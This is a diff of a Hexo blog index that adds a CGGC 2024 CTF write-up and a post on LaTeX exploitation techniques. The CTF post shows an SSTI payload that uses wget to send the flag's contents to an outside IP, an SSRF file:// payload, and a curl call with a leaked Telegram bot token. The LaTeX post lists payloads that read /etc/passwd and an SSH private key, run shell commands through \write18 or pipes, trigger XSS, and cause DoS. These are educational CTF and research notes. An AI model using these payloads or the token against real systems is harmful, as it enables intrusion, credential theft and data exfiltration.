@@ -40,6 +40,57 @@
       </tags>
   </entry>
   <entry>
+    <title>CGGC 2024 Write Up by Whale120</title>
+    <url>/2024/11/04/2024-cggc/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>又來打國網中心的CGGC啦XD<br>是跟 @naup @flydragon 和 @aukro 的蛋糕小隊久違出賽的，<del>又是一場復仇賽</del>，也算是第一次打正常的CTF破台Web，簡單紀錄下ㄅ（小吐槽，proxy那題可以用第一題unintended掉真的很玄）  </p>
+<p><img src="https://hackmd.io/_uploads/r1JZshHbke.png" alt="image">  </p>
+<p>只能說我今年盡力了，奈何我真的只能打Web和Crypto啊zzz  </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Preview-Site"><a href="#Preview-Site" class="headerlink" title="Preview Site"></a>Preview Site</h3><p>給ㄌ一個網站，hardcoded credentials(guest&#x2F;guest)，logout可以openredirect：  </p>
+<p>無腦open redirect to SSRF<br>payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://previewsite/logout?next=file:///flag</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJ_dlu4-yl.png" alt="image">  </p>
+<blockquote>
+<p>Flag: CGGC{open_redirect_to_your_local_file_2893hrgiubf3wq1}  </p>
+</blockquote>
+<h3 id="prxoy"><a href="#prxoy" class="headerlink" title="prxoy"></a>prxoy</h3><p>一個php網站，看起來就是<code>php -S 0.0.0.0:80 index.php</code>架設起來的<br><strong>source code:</strong>  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span>(<span class="params"><span class="variable">$service</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// $service = &quot;switchrange&quot;;</span></span><br><span class="line">    <span class="comment">// $service = &quot;previewsite&quot;;</span></span><br><span class="line">    <span class="comment">// $service = &quot;越獄&quot;;</span></span><br><span class="line">    <span class="variable">$requestUri</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line">    <span class="variable">$parsedUrl</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$requestUri</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$port</span> = <span class="number">80</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;port&quot;</span>]) &#123;</span><br><span class="line">        <span class="variable">$port</span> = (<span class="keyword">int</span>)<span class="variable">$_COOKIE</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;service&quot;</span>, <span class="variable">$service</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;port&quot;</span>, <span class="variable">$port</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;!$%^&amp;*()=+[]&#123;&#125;|;\&#x27;&quot;,&lt;&gt;?_-/#:.\\@&#x27;</span>;</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$service</span>, <span class="variable">$filter</span>).<span class="string">&quot;.cggc.chummy.tw:&quot;</span>.<span class="variable">$port</span>, <span class="variable">$filter</span>);</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">idn_to_ascii</span>(<span class="variable">$fixeddomain</span>);</span><br><span class="line">    <span class="variable">$fixeddomain</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^0-9a-zA-Z-.:_]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$fixeddomain</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;http://&#x27;</span>.<span class="variable">$fixeddomain</span>.<span class="variable">$parsedUrl</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;service&quot;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">proxy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;service&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">proxy</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;service&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要請求 <code>http://secretweb/flag</code> 拿到flag，注意一下程式碼會發現<code>$fixeddomain</code>參數疑似不可控（塞&#x2F;之類的），只能摸索一些其他東西<br>幾個觀察：  </p>
+<ol>
+<li><code>idn_to_ascii</code>限制域名大小最多為63，超出去就直接變空值  </li>
+<li>curl是可以請求<code>http:///</code>而且不受影響的  </li>
+<li>前面會說是<code>php -S</code>架起來的是因為請求<code>/meow</code>依然可以正常回顯</li>
+</ol>
+<p>再回來關注這段：  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;http://&#x27;</span>.<span class="variable">$fixeddomain</span>.<span class="variable">$parsedUrl</span>[<span class="string">&#x27;path&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+<p>其實只要讓<code>$fixeddomain</code>為空，<code>$parsedUrl</code>並不會受限，就可以直接請求get flagㄌ<br>Payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.99.66.6/secretweb/flag?service=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Flag: CGGC{1Dn_7O_45c11_5o_57R4n9E_11fc26f06c33e83f65ade64679dc0e58}</p>
+</blockquote>
+<h3 id="Breakjail-Online-🛜"><a href="#Breakjail-Online-🛜" class="headerlink" title="Breakjail Online 🛜"></a>Breakjail Online 🛜</h3><p>一個Free SSTI但有符號和長度限制<br><strong>app.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello, World! &lt;br&gt;&lt;a href=&#x27;/SsTiMe&#x27;&gt;SSTI me&lt;/a&gt; :/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/SsTiMe&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showip</span>():</span><br><span class="line">    <span class="comment"># WOW! There has a SSTI in Flask!!!</span></span><br><span class="line">    q = request.args.get(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;&#x27;7&#x27;*7&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># prevent smuggling bad payloads!</span></span><br><span class="line">    request.args=&#123;&#125;</span><br><span class="line">    request.headers=&#123;&#125;</span><br><span class="line">    request.cookies=&#123;&#125;</span><br><span class="line">    request.data =&#123;&#125;</span><br><span class="line">    request.query_string = <span class="string">b&quot;#&quot;</span>+request.query_string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x <span class="keyword">in</span> <span class="string">&quot;._.|||&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> q]) <span class="keyword">or</span> <span class="built_in">len</span>(q) &gt; <span class="number">88</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Too long for me :/ my payload less than 73 chars&quot;</span></span><br><span class="line"></span><br><span class="line">    res = render_template_string(<span class="string">f&quot;&#123;&#123;&#123;&#123;<span class="subst">&#123;q&#125;</span>&#125;&#125;&#125;&#125;&quot;</span>,</span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> just for debugging, remove this in production</span></span><br><span class="line">        <span class="built_in">breakpoint</span>=<span class="built_in">breakpoint</span>,</span><br><span class="line">        <span class="built_in">str</span>=<span class="built_in">str</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># oops, I just type &#x27;res&#x27; not res qq</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;res=7777777&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>基本上就是各種找Gadget去繞，我是用<code>lipsum.__globals__.os.popen</code>去跳，<code>.blablabla</code>可以用<code>[&quot;blablabla&quot;]</code>取代，<code>_</code>可以用<code>\x5f</code>去繞，結束 :D  </p>
+<p>剩下的trick就是ip換成十進制，然後透過wget和”`“去讀flag<br><img src="https://hackmd.io/_uploads/r1XKbAVbkg.png" alt="image">  </p>
+<p>Payload:  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.99.66.7:10003/SsTiMe?q=lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;][&quot;system&quot;](&quot;wget 395507846:1/`cat /flag*`&quot;)</span><br></pre></td></tr></table></figure>
+<p>長度86 &gt;w&lt;b  </p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Day31-水落石出！真相大白的十一月預告信？"><a href="#Day31-水落石出！真相大白的十一月預告信？" class="headerlink" title="Day31- 水落石出！真相大白的十一月預告信？"></a>Day31- 水落石出！真相大白的十一月預告信？</h3><p>題目說是OSINT<br><a href="https://ithelp.ithome.com.tw/users/20168875/ironman/7849">https://ithelp.ithome.com.tw/users/20168875/ironman/7849</a>  </p>
+<p>看到這篇文章<br><a href="https://ithelp.ithome.com.tw/articles/10363058">https://ithelp.ithome.com.tw/articles/10363058</a><br><img src="https://hackmd.io/_uploads/HJpvZCNbke.png" alt="image">  </p>
+<p>API Key大大大洩漏<br><img src="https://hackmd.io/_uploads/H1U8G0NbJe.png" alt="image">  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;https://api.telegram.org/bot7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM/getUpdates&quot;</span> | grep CGGC</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: CGGC{1_h8t3_y0u_K41d0_K4zm4}</p>
+</blockquote>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>打起來算開心(?)<br>很喜歡跟隊友一起討論題目的感覺，而且我似乎是不錯的助攻角色(?)<br>像是Reverse第二題打的時候我提出嘗試跳一組明文密文對跳ChaCha20特性xor解、隊友的pyjail進到pdb後也是我再跳一次jail的，希望之後能繼續享受這種討論的感覺XD  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web Security</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HITCONCMT 2024 心得</title>
     <url>/2024/08/24/2024-hitcon/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://hitcon.org/2024/CMT/">官網(link)</a><br>只能說，真的是有大量收穫，不管是知識的、拜見各種大老、<del>各種食物和紀念品</del>，也多了很多想法跟啟發，不錯owob<br>我參加的議程是這幾場：  </p>
@@ -302,7 +353,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#101;&#x72;&#114;&#x65;&#x6e;&#x63;&#x65;&#x64;&#101;&#115;&#99;&#97;&#114;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x74;&#101;&#x72;&#114;&#x65;&#x6e;&#x63;&#x65;&#x64;&#101;&#115;&#99;&#97;&#114;&#116;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#114;&#x72;&#x65;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#x61;&#114;&#116;&#x65;&#115;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#x74;&#x65;&#114;&#x72;&#x65;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#x61;&#114;&#116;&#x65;&#115;&#x40;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -310,7 +361,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#x72;&#114;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#116;&#x65;&#115;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#116;&#x65;&#x72;&#114;&#x65;&#x6e;&#99;&#x65;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#116;&#x65;&#115;&#x40;&#103;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#116;&#101;&#114;&#x72;&#x65;&#x6e;&#x63;&#101;&#x64;&#101;&#115;&#99;&#x61;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#116;&#101;&#114;&#x72;&#x65;&#x6e;&#x63;&#101;&#x64;&#101;&#115;&#99;&#x61;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -2055,22 +2106,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
-    <title>Hexo password testing</title>
-    <url>/2023/11/30/hexo-passwd-testing/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="WRONG PASSWORD!!!." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="c6b76279c4ea7bd0f83afd373a6399edb3e214991c87aafd01981fdb3c891a88">42591d26532742f79db4d0b1dde46887bbdb6264de7389de8093e64f54f4076a780f8d9be5194b5e652bf54c07e7fa568fb15cd1a7079a729af978b7b77e02437ab5e55ec77a6736f3f65f89921a4907f0246bf19001b5ef0ec7c3263c1bff12f5ae4f6a9bfac0f01f39f178f867f88dc2277dee09dc4afaa4e4e388b119bac8b1e910403088630931edc5432ce097bca7c2ff0474d20671542a00d6de97cca004707283a829a95f3bf8f659c7c2c290b8df6e68085e094eaeeb8bbdcdac10f4581c851aac70d24bb17af27619a23de98f8817e6c5dab66cc762c28772f12a02ed1f34dc0b1632d4fa09288fd749a853f86fa08ef77909d85eb75cbbdc991a3d86aee39612313854915cbd83801a8f9115938de623a2f6f99fd5218d590249360a37b8cc968fb256dac0d4b559ff0e6c6ad88b628f59bc0f1f3f8c506653db2283083fa8f84dedb8a87a3e9eda5163a2b695ea5d7451ab1bab48f60f66a0e822</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is needed.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-  </entry>
-  <entry>
     <title>Blurry Write Up on HackTheBox</title>
     <url>/2024/06/09/htb-blurry/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>全部寫完有點瑣碎，但我覺得這題利用點很有趣就貼PoC和少數過程就好ㄌ<br>之後有空把他補完(?)(其實這是上周打的但我 6&#x2F;16 才寫)<br>Attacker’s IP : 10.10.14.58<br>Victim’s Host : blurry.htb  </p>
@@ -2135,6 +2170,22 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Hexo password testing</title>
+    <url>/2023/11/30/hexo-passwd-testing/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="WRONG PASSWORD!!!." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="c6b76279c4ea7bd0f83afd373a6399edb3e214991c87aafd01981fdb3c891a88">42591d26532742f79db4d0b1dde46887bbdb6264de7389de8093e64f54f4076a780f8d9be5194b5e652bf54c07e7fa568fb15cd1a7079a729af978b7b77e02437ab5e55ec77a6736f3f65f89921a4907f0246bf19001b5ef0ec7c3263c1bff12f5ae4f6a9bfac0f01f39f178f867f88dc2277dee09dc4afaa4e4e388b119bac8b1e910403088630931edc5432ce097bca7c2ff0474d20671542a00d6de97cca004707283a829a95f3bf8f659c7c2c290b8df6e68085e094eaeeb8bbdcdac10f4581c851aac70d24bb17af27619a23de98f8817e6c5dab66cc762c28772f12a02ed1f34dc0b1632d4fa09288fd749a853f86fa08ef77909d85eb75cbbdc991a3d86aee39612313854915cbd83801a8f9115938de623a2f6f99fd5218d590249360a37b8cc968fb256dac0d4b559ff0e6c6ad88b628f59bc0f1f3f8c506653db2283083fa8f84dedb8a87a3e9eda5163a2b695ea5d7451ab1bab48f60f66a0e822</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password is needed.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+  </entry>
+  <entry>
     <title>HackTheBox GamePwn 隨筆 4/20</title>
     <url>/2024/04/20/htb-gamepwn-2024apr/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>最近打HTB，發現了GamePwn這個好玩的領域。<br>顧名思義，就是一些遊戲作弊的挑戰，然後打起來挺好玩的w<br>然後…<del>其實都是昨天打得</del><br>這邊丟兩個昨天打起來覺得有趣的題目w  </p>
@@ -2164,6 +2215,47 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>CTF</tag>
         <tag>HackTheBox</tag>
         <tag>game hacking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>那些年，LaTeX的N種利用方法</title>
+    <url>/2024/08/08/latex-vuln/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是一份對我AIS3時做的專題進行的整理，但是相關軟體和一些關鍵部分將暫時無法撰寫(0 day仍在通報中)<br>我想蠻多人都有用過LaTeX這個數學排版語言，但可能大家並不知道LaTeX的編譯其實有很多種kernel，相關的衍伸套件與軟體更是不勝枚舉，從而產生了一些有趣的利用方法<br>攻擊面大致分兩種：  </p>
+<ul>
+<li>一個網站使用了有問題的LaTeX套件</li>
+<li>受害者打開了惡意的 .tex 檔案，並用有問題的軟體讀取它</li>
+</ul>
+<p>本文對於LaTeX相關套件的漏洞利用方法分三種：  </p>
+<ul>
+<li>既有函數的濫用</li>
+<li>基於解析函數的注入攻擊</li>
+<li>有問題的模塊利用</li>
+</ul>
+<p>事實上，這些研究的威脅性並沒有那麼大，但簡單易理解的利用方法依然值得玩味，也期待有人玩出更多花招XD (整個ais3我大概只有三天研究，盡力ㄌ)  </p>
+<h2 id="既有函數的濫用"><a href="#既有函數的濫用" class="headerlink" title="既有函數的濫用"></a>既有函數的濫用</h2><p>利用既有函數的功能可以打出 LFI, oob write, Click XSS, RCE和DoS  </p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>因為LaTeX支援引入模板檔案，導致可以進行檔案讀取。<br>很多編輯器的防治方法是強制加入 .tex 的副檔名，基本上不要是過舊的語言版本就沒方法繞ㄌ  </p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\input</span>&#123;/etc/passwd&#125;</span><br><span class="line"><span class="keyword">\include</span>&#123;/home/wha13/.ssh/id<span class="built_in">_</span>rsa&#125;</span><br><span class="line"><span class="keyword">\lstinputlisting</span>&#123;/usr/share/texmf/web2c/texmf.cnf&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="oob-write"><a href="#oob-write" class="headerlink" title="oob write"></a>oob write</h3><p>道理跟剛剛LFI一樣，問題出在寫檔函數  </p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\newwrite</span><span class="keyword">\outfile</span></span><br><span class="line"><span class="keyword">\openout</span><span class="keyword">\outfile</span>=cmd.tex</span><br><span class="line"><span class="keyword">\write</span><span class="keyword">\outfile</span>&#123;Hello-world&#125;</span><br><span class="line"><span class="keyword">\closeout</span><span class="keyword">\outfile</span></span><br></pre></td></tr></table></figure>
+<h3 id="Click-XSS"><a href="#Click-XSS" class="headerlink" title="Click XSS"></a>Click XSS</h3><p>LaTeX支援url，導致可以塞入 <code>javascript:...</code> 這類的協議濫用，受害者點下去後就開心執行javascript…  </p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\url</span>&#123;<span class="link">javascript:alert(1)</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>在LaTeX中，有些預定函數如 <code>\write18</code> 本來的功能就是執行系統命令，不過這個東西在編譯的時候可以自行加入<code>--no-shell-escape</code>的flag進行防治。  </p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\immediate</span><span class="keyword">\write</span>18&#123;env &gt; output&#125;</span><br><span class="line"><span class="keyword">\input</span>&#123;output&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>重複定義，打法跟fork bomb很像  </p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\def</span><span class="keyword">\x</span>&#123;<span class="keyword">\x</span>&#125;<span class="keyword">\x</span></span><br><span class="line"><span class="keyword">\def</span><span class="keyword">\x</span>&#123;<span class="keyword">\x</span> <span class="keyword">\x</span>&#125;<span class="keyword">\x</span></span><br></pre></td></tr></table></figure>
+<p>不過基本上都會撞到記憶體限制</p>
+<h2 id="基於解析函數的注入攻擊"><a href="#基於解析函數的注入攻擊" class="headerlink" title="基於解析函數的注入攻擊"></a>基於解析函數的注入攻擊</h2><p>其實我有在某些解析器打出其他注入法可以玩XSS，不過現在不能公開QwQ  </p>
+<p>網路上有個奇怪的payload <code>\input&#123;|&quot;whoami&quot;&#125;</code> ，不過好像都沒有發現原因。<br>打開overleaf試了下，發現居然可以?!<br><img src="https://hackmd.io/_uploads/rJnrm8M9A.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkdLX8f9R.png" alt="image">  </p>
+<p>啊哈，原來因為有獨立VM所以變成一個issue<br>但…為什麼會這樣?<br>故意製造了一下error追原因<br><img src="https://hackmd.io/_uploads/S1bYQ8MqC.png" alt="image">  </p>
+<p>問題好像出在texlive這個解析器身上，code review:<br><a href="https://github.com/TeX-Live/texlive-source/blob/ab42be5a046c960f3ff4a896b1beda6347cb3799/utils/asymptote/picture.cc#L410">https://github.com/TeX-Live/texlive-source/blob/ab42be5a046c960f3ff4a896b1beda6347cb3799/utils/asymptote/picture.cc#L410</a><br>這個函數會把所有參數吞了以後丟到一個vector去執行它，然後沒有過濾?!<br>試了幾個跟texlive相關的軟體發現果然可以，當中不乏可以達成點開檔案即RCE的弱點…  </p>
+<h2 id="有問題的模塊利用"><a href="#有問題的模塊利用" class="headerlink" title="有問題的模塊利用"></a>有問題的模塊利用</h2><p>pythontex可以執行任意python指令並輸出結果，有些LaTeX軟體又可以自動下載第一次使用的模塊，就開心RCEㄌ<br>晚安狐狸晚安我的世界<br>喵喵喵<br>我是鯨魚  </p>
+]]></content>
+      <tags>
+        <tag>LaTeX</tag>
+        <tag>CVE</tag>
       </tags>
   </entry>
   <entry>
@@ -2206,47 +2298,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>CTF</tag>
         <tag>ICEDTEA</tag>
         <tag>Jail</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>那些年，LaTeX的N種利用方法</title>
-    <url>/2024/08/08/latex-vuln/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是一份對我AIS3時做的專題進行的整理，但是相關軟體和一些關鍵部分將暫時無法撰寫(0 day仍在通報中)<br>我想蠻多人都有用過LaTeX這個數學排版語言，但可能大家並不知道LaTeX的編譯其實有很多種kernel，相關的衍伸套件與軟體更是不勝枚舉，從而產生了一些有趣的利用方法<br>攻擊面大致分兩種：  </p>
-<ul>
-<li>一個網站使用了有問題的LaTeX套件</li>
